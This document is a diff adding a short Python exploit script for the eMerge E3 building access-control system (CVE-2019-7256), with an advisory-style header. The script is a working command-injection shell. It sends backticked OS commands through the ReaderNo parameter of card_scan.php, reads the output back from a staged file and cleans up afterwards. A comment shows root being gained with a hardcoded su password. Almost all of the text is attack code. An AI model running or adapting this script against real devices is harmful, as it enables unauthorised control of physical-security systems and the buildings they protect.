@@ -1,0 +1,60 @@
+# Exploit Title: eMerge E3 1.00-06 - Remote Code Execution
+# Google Dork: NA
+# Date: 2018-09-11
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
+# Software Link: http://linear-solutions.com/nsc_family/e3-series/
+# Version: 1.00-06
+# Tested on: NA
+# CVE : CVE-2019-7256
+# Advisory: https://applied-risk.com/resources/ar-2019-009
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+# Advisory: https://applied-risk.com/resources/ar-2019-005
+
+#!/usr/bin/env python
+#
+###################################################################
+# lqwrm@metalgear:~/stuff$ python emergeroot1.py 192.168.1.2
+#
+# lighttpd@192.168.1.2:/spider/web/webroot$ id
+# uid=1003(lighttpd) gid=0(root)
+#
+# lighttpd@192.168.1.2:/spider/web/webroot$ echo davestyle |su -c id
+# Password: 
+# uid=0(root) gid=0(root) groups=0(root)
+#
+# lighttpd@192.168.1.2:/spider/web/webroot$ exit
+#
+# [+] Erasing read stage file and exiting...
+# [+] Done. Ba-bye!
+#
+###################################################################
+
+import requests
+import sys,os##
+
+piton = os.path.basename(sys.argv[0])
+
+if len(sys.argv) < 2:
+	print '\n\x20\x20[*] Usage: '+piton+' <ipaddress:port>\n'
+	sys.exit()
+
+ipaddr = sys.argv[1]
+
+print
+while True:
+	try:
+		cmd = raw_input('lighttpd@'+ipaddr+':/spider/web/webroot$ ')
+		execute = requests.get('http://'+ipaddr+'/card_scan.php?No=30&ReaderNo=%60'+cmd+' > test.txt%60')
+		readreq = requests.get('http://'+ipaddr+'/test.txt')
+		print readreq.text
+		if cmd.strip() == 'exit':
+			print "[+] Erasing read stage file and exiting..."
+			requests.get('http://'+ipaddr+'/card_scan.php?No=30&ReaderNo=%60rm test.txt%60')
+			print "[+] Done. Ba-bye!\n"
+			break
+		else: continue
+	except Exception:
+		break
+
+sys.exit()
